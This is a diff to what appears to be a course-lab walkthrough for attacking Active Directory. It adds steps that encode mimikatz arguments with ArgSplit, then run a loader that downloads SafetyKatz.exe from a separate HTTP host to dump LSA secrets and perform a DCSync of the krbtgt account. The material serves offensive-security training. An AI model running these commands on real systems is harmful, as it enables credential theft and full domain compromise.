@@ -22,3 +22,29 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 Now we're going to use ArgSplit on the student VM to encode `lsadump::lsa`
 
 <figure><img src="../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>
+
+And then we will put it on the Admin instance that popped&#x20;
+
+This will allow us to run the following command (don't forget to run a wsl python server to go and fetch the SafteyKatz exe)
+
+```
+C:\Users\Public\Loader.exe -path http://172.13.100.13:5454/SafetyKatz.exe -args "%Pwn% /patch" "exit"
+```
+
+<figure><img src="../../.gitbook/assets/image (1112).png" alt=""><figcaption></figcaption></figure>
+
+And this will dump the hashes we need:
+
+<figure><img src="../../.gitbook/assets/image (1113).png" alt=""><figcaption></figcaption></figure>
+
+now try encoding `lsadump::dcsync`
+
+And we can run the following:
+
+```
+C:\Users\Public\Loader.exe -path http://172.16.100.13:5454/SafetyKatz.exe -args "%Pwn% /user:dcorp\krbtgt" "exit"
+```
+
+<figure><img src="../../.gitbook/assets/image (1114).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1115).png" alt=""><figcaption></figcaption></figure>
